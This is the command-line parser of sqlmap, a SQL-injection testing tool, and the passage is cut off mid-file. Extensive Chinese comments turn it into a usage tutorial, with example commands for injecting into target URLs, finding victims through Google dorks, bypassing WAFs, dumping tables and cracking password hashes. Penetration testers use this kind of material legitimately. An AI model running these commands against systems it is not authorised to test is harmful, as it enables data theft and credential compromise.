#!/usr/bin/env python
#-*- coding:utf-8 -*-
"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""
'''
参考网站地址：http://drops.wooyun.org/tips/143
'''
import os
import re
import shlex
import sys

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser
from optparse import SUPPRESS_HELP

from lib.core.common import checkDeprecatedOptions
from lib.core.common import checkSystemEncoding
from lib.core.common import expandMnemonics
from lib.core.common import getUnicode
from lib.core.data import cmdLineOptions
from lib.core.data import conf
from lib.core.data import logger
from lib.core.defaults import defaults
from lib.core.enums import AUTOCOMPLETE_TYPE
from lib.core.exception import SqlmapShellQuitException
from lib.core.exception import SqlmapSyntaxException
from lib.core.settings import BASIC_HELP_ITEMS
from lib.core.settings import DUMMY_URL
from lib.core.settings import IS_WIN
from lib.core.settings import MAX_HELP_OPTION_LENGTH
from lib.core.settings import VERSION_STRING
from lib.core.shell import autoCompletion
from lib.core.shell import clearHistory
from lib.core.shell import loadHistory
from lib.core.shell import saveHistory

def cmdLineParser(argv=None):
    """
    This function parses the command line parameters and arguments
    """

    if not argv:
        argv = sys.argv

    checkSystemEncoding()   #检查系统编码,默认为unicode编码

    '''
    os.path.basename(path) #返回文件名
    _表示的结果是sqlmap.py
    '''
    _ = getUnicode(os.path.basename(argv[0]), encoding=sys.getfilesystemencoding())

    usage = "%s%s [options]" % ("python " if not IS_WIN else "", \
            "\"%s\"" % _ if " " in _ else _)

    parser = OptionParser(usage=usage)

    try:
        parser.add_option("--hh", dest="advancedHelp",
                          action="store_true",
                          help="Show advanced help message and exit")

        parser.add_option("--version", dest="showVersion",
                          action="store_true",
                          help="Show program's version number and exit")

        parser.add_option("-v", dest="verbose", type="int",
                          help="Verbosity level: 0-6 (default %d)" % defaults.verbose)

        # Target options 目标系统
        target = OptionGroup(parser, "Target", "At least one of these "
                             "options has to be provided to define the target(s)")

        target.add_option("-d", dest="direct", help="Connection string "
                          "for direct database connection")

        '''目标URL
        参数：-u或者--url
        格式：http(s)://targeturl[:port]/[…]
        例如：python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
        '''
        target.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")")

        '''从Burp或者WebScarab代理中获取日志
        参数：-l
        可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。
        '''
        target.add_option("-l", dest="logFile", help="Parse target(s) from Burp "
                          "or WebScarab proxy log file")

        target.add_option("-x", dest="sitemapUrl", help="Parse target(s) from remote sitemap(.xml) file")

        '''从文本中获取多个目标扫描
        参数：-m
        文件中保存url格式如下，sqlmap会一个一个检测
            www.target1.com/vuln1.php?q=foobar
            www.target2.com/vuln2.asp?id=1
            www.target3.com/vuln3/id/1*
        '''
        target.add_option("-m", dest="bulkFile", help="Scan multiple targets given "
                          "in a textual file ")

        '''从文件中加载HTTP请求
        参数：-r
        sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。
        比如文本文件内如下：
        POST /vuln.php HTTP/1.1
        Host: www.target.com
        User-Agent: Mozilla/4.0

        id=1
        当请求是HTTPS的时候你需要配合这个--force-ssl参数来使用，或者你可以在Host头后面加上:443
        '''
        target.add_option("-r", dest="requestFile",
                          help="Load HTTP request from a file")

        '''处理Google的搜索结果
        参数：-g
        sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。
        例子：
        python sqlmap.py -g "inurl:\".php?id=1\""
        （很牛B的功能，测试了一下，第十几个就找到新浪的一个注入点）
        此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。
        '''
        target.add_option("-g", dest="googleDork",
                          help="Process Google dork results as target URLs")

        target.add_option("-c", dest="configFile",
                          help="Load options from a configuration INI file")

        # Request options 请求
        request = OptionGroup(parser, "Request", "These options can be used "
                              "to specify how to connect to the target URL")

        request.add_option("--method", dest="method",
                           help="Force usage of given HTTP method (e.g. PUT)")

        '''http数据
        参数：--data
        此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。
        例子：
        python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users
        '''
        request.add_option("--data", dest="data",
                           help="Data string to be sent through POST")

        '''参数拆分字符
        参数：--param-del
        当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。
        例子：
        python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users
        '''
        request.add_option("--param-del", dest="paramDel",
                           help="Character used for splitting parameter values")

        '''HTTP cookie头
        参数：--cookie,--load-cookies,--drop-set-cookie
        这个参数在以下两个方面很有用：
        1、web应用需要登陆的时候。
        2、你想要在这些头参数中测试SQL注入时。
        可以通过抓包把cookie获取到，复制出来，然后加到--cookie参数里。
        在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。
        如果你不想接受Set-Cookie可以使用--drop-set-cookie参数来拒接。
        当你使用--cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。
        当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。
        '''
        request.add_option("--cookie", dest="cookie",
                           help="HTTP Cookie header value")

        request.add_option("--cookie-del", dest="cookieDel",
                           help="Character used for splitting cookie values")

        request.add_option("--load-cookies", dest="loadCookies",
                           help="File containing cookies in Netscape/wget format")

        request.add_option("--drop-set-cookie", dest="dropSetCookie",
                           action="store_true",
                           help="Ignore Set-Cookie header from response")

        '''HTTP User-Agent头
        参数：--user-agent,--random-agent
        默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
        可以使用--user-anget参数来修改，同时也可以使用--random-agnet参数来随机的从./txt/user-agents.txt中获取。
        当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。
        '''
        request.add_option("--user-agent", dest="agent",
                           help="HTTP User-Agent header value")

        request.add_option("--random-agent", dest="randomAgent",
                           action="store_true",
                           help="Use randomly selected HTTP User-Agent header value")

        request.add_option("--host", dest="host",
                           help="HTTP Host header value")

        '''HTTP Referer头
        参数：--referer
        sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。
        '''
        request.add_option("--referer", dest="referer",
                           help="HTTP Referer header value")

        request.add_option("-H", "--header", dest="header",
                           help="Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")")

        '''额外的HTTP头
        参数：--headers
        可以通过--headers参数来增加额外的http头
        '''
        request.add_option("--headers", dest="headers",
                           help="Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\")")

        '''HTTP认证保护
        参数：--auth-type,--auth-cred
        这些参数可以用来登陆HTTP的认证保护支持三种方式：
        1、Basic
        2、Digest
        3、NTLM or PKI
        例子：python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
        '''
        request.add_option("--auth-type", dest="authType",
                           help="HTTP authentication type "
                                "(Basic, Digest, NTLM or PKI)")

        request.add_option("--auth-cred", dest="authCred",
                           help="HTTP authentication credentials "
                                "(name:password)")

        request.add_option("--auth-file", dest="authFile",
                           help="HTTP authentication PEM cert/private key file")

        request.add_option("--ignore-401", dest="ignore401", action="store_true",
                          help="Ignore HTTP Error 401 (Unauthorized)")

        '''HTTP(S)代理
        参数：--proxy,--proxy-cred和--ignore-proxy
        使用--proxy代理是格式为：http://url:port。
        当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。
        --ignore-proxy拒绝使用本地局域网的HTTP(S)代理。
        '''
        request.add_option("--proxy", dest="proxy",
                           help="Use a proxy to connect to the target URL")

        request.add_option("--proxy-cred", dest="proxyCred",
                           help="Proxy authentication credentials "
                                "(name:password)")

        request.add_option("--proxy-file", dest="proxyFile",
                           help="Load proxy list from a file")

        request.add_option("--ignore-proxy", dest="ignoreProxy", action="store_true",
                           help="Ignore system default proxy settings")

        request.add_option("--tor", dest="tor",
                                  action="store_true",
                                  help="Use Tor anonymity network")

        request.add_option("--tor-port", dest="torPort",
                                  help="Set Tor proxy port other than default")

        request.add_option("--tor-type", dest="torType",
                                  help="Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)")

        request.add_option("--check-tor", dest="checkTor",
                                  action="store_true",
                                  help="Check to see if Tor is used properly")

        '''HTTP请求延迟
        参数：--delay
        可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。
        '''
        request.add_option("--delay", dest="delay", type="float",
                           help="Delay in seconds between each HTTP request")

        '''设定超时时间
        参数：--timeout
        可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。
        '''
        request.add_option("--timeout", dest="timeout", type="float",
                           help="Seconds to wait before timeout connection "
                                "(default %d)" % defaults.timeout)

        '''
        设定重试超时
        参数：--retries
        当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。
        '''
        request.add_option("--retries", dest="retries", type="int",
                           help="Retries when the connection timeouts "
                                "(default %d)" % defaults.retries)

        '''设定随机改变的参数值
        参数：--randomize
        可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。
        '''
        request.add_option("--randomize", dest="rParam",
                           help="Randomly change value for given parameter(s)")

        '''避免过多的错误请求被屏蔽
        参数：--safe-url,--safe-freq
        有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。
        绕过这个策略有两种方式：
        1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
        2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
        '''
        request.add_option("--safe-url", dest="safeUrl",
                           help="URL address to visit frequently during testing")

        request.add_option("--safe-post", dest="safePost",
                           help="POST data to send to a safe URL")

        request.add_option("--safe-req", dest="safeReqFile",
                           help="Load safe HTTP request from a file")

        request.add_option("--safe-freq", dest="safeFreq", type="int",
                           help="Test requests between two visits to a given safe URL")

        '''关掉URL参数值编码
        参数：--skip-urlencode
        根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用--skip-urlencode参数。
        '''
        request.add_option("--skip-urlencode", dest="skipUrlEncode",
                           action="store_true",
                           help="Skip URL encoding of payload data")

        request.add_option("--csrf-token", dest="csrfToken",
                           help="Parameter used to hold anti-CSRF token")

        request.add_option("--csrf-url", dest="csrfUrl",
                           help="URL address to visit to extract anti-CSRF token")

        request.add_option("--force-ssl", dest="forceSSL",
                           action="store_true",
                           help="Force usage of SSL/HTTPS")

        '''使用HTTP参数污染
        参数：-hpp
        HTTP参数污染可能会绕过WAF/IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效。
        '''
        request.add_option("--hpp", dest="hpp",
                                  action="store_true",
                                  help="Use HTTP parameter pollution method")

        '''每次请求时候之前执行自定义的python代码
        参数：--eval
        在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。
        例子：
        python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
        上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。
        '''
        request.add_option("--eval", dest="evalCode",
                           help="Evaluate provided Python code before the request (e.g. \"import hashlib;id2=hashlib.md5(id).hexdigest()\")")

        # Optimization options 优化
        optimization = OptionGroup(parser, "Optimization", "These "
                               "options can be used to optimize the "
                               "performance of sqlmap")

        optimization.add_option("-o", dest="optimize",
                                 action="store_true",
                                 help="Turn on all optimization switches")

        optimization.add_option("--predict-output", dest="predictOutput", action="store_true",
                          help="Predict common queries output")

        optimization.add_option("--keep-alive", dest="keepAlive", action="store_true",
                           help="Use persistent HTTP(s) connections")

        optimization.add_option("--null-connection", dest="nullConnection", action="store_true",
                          help="Retrieve page length without actual HTTP response body")

        optimization.add_option("--threads", dest="threads", type="int",
                           help="Max number of concurrent HTTP(s) "
                                "requests (default %d)" % defaults.threads)

        # Injection options 注入
        injection = OptionGroup(parser, "Injection", "These options can be "
                                "used to specify which parameters to test "
                                "for, provide custom injection payloads and "
                                "optional tampering scripts")

        '''测试参数
        参数：-p,--skip
        sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，
        当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p "id,user-anget"
        当你使用--level的值很大但是有个别参数不想测试的时候可以使用--skip参数。
        例如：--skip="user-angent.referer"
        在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*
        例如：python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"
        sqlmap将会测试value1的位置是否可注入。
        '''
        injection.add_option("-p", dest="testParameter",
                             help="Testable parameter(s)")

        injection.add_option("--skip", dest="skip",
                             help="Skip testing for given parameter(s)")

        injection.add_option("--skip-static", dest="skipStatic", action="store_true",
                             help="Skip testing parameters that not appear dynamic")

        '''指定数据库
        参数：--dbms
        默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：
        MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2
        '''
        injection.add_option("--dbms", dest="dbms",
                             help="Force back-end DBMS to this value")

        '''DBMS身份验证
        参数：--dbms-cred
        某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，
        可以切换用户如Microsoft SQL Server的OPENROWSET函数
        '''
        injection.add_option("--dbms-cred", dest="dbmsCred",
                            help="DBMS authentication credentials (user:password)")

        '''指定数据库服务器系统
        参数：--os
        默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。
        '''
        injection.add_option("--os", dest="os",
                             help="Force back-end DBMS operating system "
                                  "to this value")

        '''指定无效的大数字
        参数：--invalid-bignum
        当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。
        '''
        injection.add_option("--invalid-bignum", dest="invalidBignum",
                             action="store_true",
                             help="Use big numbers for invalidating values")

        '''指定无效的逻辑
        参数：--invalid-logical
        原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。
        '''
        injection.add_option("--invalid-logical", dest="invalidLogical",
                             action="store_true",
                             help="Use logical operations for invalidating values")

        injection.add_option("--invalid-string", dest="invalidString",
                             action="store_true",
                             help="Use random strings for invalidating values")

        injection.add_option("--no-cast", dest="noCast",
                             action="store_true",
                             help="Turn off payload casting mechanism")

        injection.add_option("--no-escape", dest="noEscape",
                             action="store_true",
                             help="Turn off string escaping mechanism")

        '''注入payload
        参数：--prefix,--suffix
        在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。
        例如，代码中是这样调用数据库的：
        $query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1";
        这时你就需要--prefix和--suffix参数了：
        python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
        这样执行的SQL语句变成：$query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1";
        '''
        injection.add_option("--prefix", dest="prefix",
                             help="Injection payload prefix string")

        injection.add_option("--suffix", dest="suffix",
                             help="Injection payload suffix string")

        '''修改注入的数据
        参数：--tamper
        sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用--tamper参数对数据做修改来绕过WAF等设备。
        可以查看 tamper/ 目录下的有哪些可用的脚本
        例如：
        $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
        '''
        injection.add_option("--tamper", dest="tamper",
                             help="Use given script(s) for tampering injection data")

        # Detection options 探测
        detection = OptionGroup(parser, "Detection", "These options can be "
                                "used to customize the detection phase")

        '''探测等级
        参数：--level
        共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。
        这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。
        总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。
        '''
        detection.add_option("--level", dest="level", type="int",
                             help="Level of tests to perform (1-5, "
                                  "default %d)" % defaults.level)

        '''风险等级
        参数：--risk
        共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
        在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。
        测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。
        '''
        detection.add_option("--risk", dest="risk", type="int",
                             help="Risk of tests to perform (1-3, "
                                  "default %d)" % defaults.level)

        '''页面比较
        参数：--string,--not-string,--regexp,--code
        默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，
        比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，
        在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），
        同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。
        用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。
        参数：--text-only,--titles
        有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）
        --titles（HTML的title标签中不同）。
        '''
        detection.add_option("--string", dest="string",
                             help="String to match when "
                                  "query is evaluated to True")

        detection.add_option("--not-string", dest="notString",
                             help="String to match when "
                                  "query is evaluated to False")

        detection.add_option("--regexp", dest="regexp",
                             help="Regexp to match when "
                                  "query is evaluated to True")

        detection.add_option("--code", dest="code", type="int",
                             help="HTTP code to match when "
                                  "query is evaluated to True")

        detection.add_option("--text-only", dest="textOnly",
                             action="store_true",
                             help="Compare pages based only on the textual content")

        detection.add_option("--titles", dest="titles",
                             action="store_true",
                             help="Compare pages based only on their titles")

        # Techniques options 注入技术
        techniques = OptionGroup(parser, "Techniques", "These options can be "
                                 "used to tweak testing of specific SQL "
                                 "injection techniques")

        '''测试是否是注入
        参数：--technique
        这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。
        支持的探测方式如下：
        B: Boolean-based blind SQL injection（布尔型注入）
        E: Error-based SQL injection（报错型注入）
        U: UNION query SQL injection（可联合查询注入）
        S: Stacked queries SQL injection（可多语句查询注入）
        T: Time-based blind SQL injection（基于时间延迟注入）
        '''
        techniques.add_option("--technique", dest="tech",
                              help="SQL injection techniques to use "
                                   "(default \"%s\")" % defaults.tech)

        '''设定延迟注入的时间
        参数：--time-sec
        当使用基于时间的盲注时，此刻使用--time-sec参数设定延时时间，默认是5秒。
        '''
        techniques.add_option("--time-sec", dest="timeSec",
                              type="int",
                              help="Seconds to delay the DBMS response "
                                   "(default %d)" % defaults.timeSec)

        '''设定UNION查询字段数
        参数：--union-cols
        默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候它会增加测试到50个字段数。
        设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。
        '''
        techniques.add_option("--union-cols", dest="uCols",
                              help="Range of columns to test for UNION query SQL injection")

        '''设定UNION查询使用的字符
        参数：--union-char
        默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，
        这时你就可以用--union-char只定UNION查询的字符。
        '''
        techniques.add_option("--union-char", dest="uChar",
                              help="Character to use for bruteforcing number of columns")

        techniques.add_option("--union-from", dest="uFrom",
                              help="Table to use in FROM part of UNION query SQL injection")

        techniques.add_option("--dns-domain", dest="dnsName",
                              help="Domain name used for DNS exfiltration attack")

        '''二阶SQL注入
        参数：--second-order
        有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。
        --second-order后面跟一个判断页面的URL地址。
        '''
        techniques.add_option("--second-order", dest="secondOrder",
                             help="Resulting page URL searched for second-order "
                                  "response")

        # Fingerprint options  列数据
        fingerprint = OptionGroup(parser, "Fingerprint")

        fingerprint.add_option("-f", "--fingerprint", dest="extensiveFp",
                               action="store_true",
                               help="Perform an extensive DBMS version fingerprint")

        # Enumeration options
        enumeration = OptionGroup(parser, "Enumeration", "These options can "
                                  "be used to enumerate the back-end database "
                                  "management system information, structure "
                                  "and data contained in the tables. Moreover "
                                  "you can run your own SQL statements")

        enumeration.add_option("-a", "--all", dest="getAll",
                               action="store_true", help="Retrieve everything")

        '''标志
        参数：-b,--banner
        大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。
        '''
        enumeration.add_option("-b", "--banner", dest="getBanner",
                               action="store_true", help="Retrieve DBMS banner")

        '''用户
        参数：-current-user
        在大多数据库中可以获取到管理数据的用户。
        '''
        enumeration.add_option("--current-user", dest="getCurrentUser",
                               action="store_true",
                               help="Retrieve DBMS current user")

        '''
        当前数据库
        参数：--current-db
        返还当前连接的数据库。
        '''
        enumeration.add_option("--current-db", dest="getCurrentDb",
                               action="store_true",
                               help="Retrieve DBMS current database")

        enumeration.add_option("--hostname", dest="getHostname",
                               action="store_true",
                               help="Retrieve DBMS server hostname")

        '''当前用户是否为管理员
        参数：--is-dba
        判断当前的用户是否为管理，是的话会返回True。
        '''
        enumeration.add_option("--is-dba", dest="isDba",
                               action="store_true",
                               help="Detect if the DBMS current user is DBA")

        '''列数据库管理用户
        参数：--users
        当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。
        '''
        enumeration.add_option("--users", dest="getUsers", action="store_true",
                               help="Enumerate DBMS users")

        '''列出并破解数据库用户的hash
        参数：--passwords
        当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解.
        可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持Oracle和Microsoft SQL Server。
        也可以提供-U参数来指定爆破哪个用户的hash。
        例子：
        $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1
        '''
        enumeration.add_option("--passwords", dest="getPasswordHashes",
                               action="store_true",
                               help="Enumerate DBMS users password hashes")

        '''列出数据库管理员权限
        参数：--privileges
        当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。
        也可以用-U参数指定你想看哪个用户的权限。
        '''
        enumeration.add_option("--privileges", dest="getPrivileges",
                               action="store_true",
                               help="Enumerate DBMS users privileges")

        '''列出数据库管理员角色
        参数：--roles
        当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。
        仅适用于当前数据库是Oracle的时候。
        '''
        enumeration.add_option("--roles", dest="getRoles",
                               action="store_true",
                               help="Enumerate DBMS users roles")

        '''列出数据库系统的数据库
        参数：--dbs
        当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库
        '''
        enumeration.add_option("--dbs", dest="getDbs", action="store_true",
                               help="Enumerate DBMS databases")

        '''
        列举数据库表
        参数：--tables,--exclude-sysdbs,-D
        当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。
        如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。
        --exclude-sysdbs参数是指包含了所有的系统数据库。
        需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。
        '''
        enumeration.add_option("--tables", dest="getTables", action="store_true",
                               help="Enumerate DBMS database tables")

        '''列举数据库表中的字段
        参数：--columns,-C,-T,-D
        当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。
        如果没有使用-D参数指定数据库时，默认会使用当前数据库。
        列举一个SQLite的例子：
        $ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb -T users -C name
        '''
        enumeration.add_option("--columns", dest="getColumns", action="store_true",
                               help="Enumerate DBMS database table columns")

        '''列举数据库系统的架构
        参数：--schema,--exclude-sysdbs
        用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。
        加上--exclude-sysdbs参数，将不会获取数据库自带的系统库内容。
        MySQL例子：
        $ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
        '''
        enumeration.add_option("--schema", dest="getSchema", action="store_true",
                               help="Enumerate DBMS schema")

        '''获取表中数据个数
        参数：--count
        有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。
        列举一个Microsoft SQL Server例子：
        $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
        '''
        enumeration.add_option("--count", dest="getCount", action="store_true",
                               help="Retrieve number of entries for table(s)")

        '''获取整个表的数据
        参数：--dump,-C,-T,-D,--start,--stop,--first,--last
        如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。
        可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。
        也可以用-dump跟-C获取指定的字段内容。sqlmap为每个表生成了一个CSV文件。
        如果你只想获取一段数据，可以使用--start和--stop参数，例如，你只想获取第一段数据可hi使用--stop 1，如果想获取第二段与第三段数据，使用参数 --start 1 --stop 3。
        也可以用--first与--last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用--first 3 --last 5。
        只有在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。
        列举一个Firebird的例子：
        $ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
        '''
        enumeration.add_option("--dump", dest="dumpTable", action="store_true",
                               help="Dump DBMS database table entries")

        '''
        获取所有数据库表的内容
        参数：--dump-all,--exclude-sysdbs
        使用--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，
        需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。
        '''
        enumeration.add_option("--dump-all", dest="dumpAll", action="store_true",
                               help="Dump all DBMS databases tables entries")

        '''搜索字段，表，数据库
        参数：--search,-C,-T,-D
        --search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。可以在一下三种情况下使用：
            -C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
            -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
            -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
        '''
        enumeration.add_option("--search", dest="search", action="store_true",
                               help="Search column(s), table(s) and/or database name(s)")

        enumeration.add_option("--comments", dest="getComments", action="store_true",
                               help="Retrieve DBMS comments")

        enumeration.add_option("-D", dest="db",
                               help="DBMS database to enumerate")

        enumeration.add_option("-T", dest="tbl",
                               help="DBMS database table(s) to enumerate")

        enumeration.add_option("-C", dest="col",
                               help="DBMS database table column(s) to enumerate")

        enumeration.add_option("-X", dest="excludeCol",
                               help="DBMS database table column(s) to not enumerate")

        enumeration.add_option("-U", dest="user",
                               help="DBMS user to enumerate")

        enumeration.add_option("--exclude-sysdbs", dest="excludeSysDbs",
                               action="store_true",
                               help="Exclude DBMS system databases when "
                                    "enumerating tables")

        enumeration.add_option("--pivot-column", dest="pivotColumn",
                               help="Pivot column name")

        enumeration.add_option("--where", dest="dumpWhere",
                               help="Use WHERE condition while table dumping")

        enumeration.add_option("--start", dest="limitStart", type="int",
                               help="First query output entry to retrieve")

        enumeration.add_option("--stop", dest="limitStop", type="int",
                               help="Last query output entry to retrieve")

        enumeration.add_option("--first", dest="firstChar", type="int",
                               help="First query output word character to retrieve")

        enumeration.add_option("--last", dest="lastChar", type="int",
                               help="Last query output word character to retrieve")

        '''运行自定义的SQL语句
        参数：--sql-query,--sql-shell
        sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
        如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。
        列举一个Mircrosoft SQL Server 2000的例子：
        $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1
        '''
        enumeration.add_option("--sql-query", dest="query",
                               help="SQL statement to be executed")

        enumeration.add_option("--sql-shell", dest="sqlShell",
                               action="store_true",
                               help="Prompt for an interactive SQL shell")

        enumeration.add_option("--sql-file", dest="sqlFile",
                               help="Execute SQL statements from given file(s)")

        # Brute force options  爆破
        brute = OptionGroup(parser, "Brute force", "These "
                          "options can be used to run brute force "
                          "checks")

        '''暴力破解表名
        参数：--common-tables
        当使用--tables无法获取到数据库的表时，可以使用此参数。
        通常是如下情况：
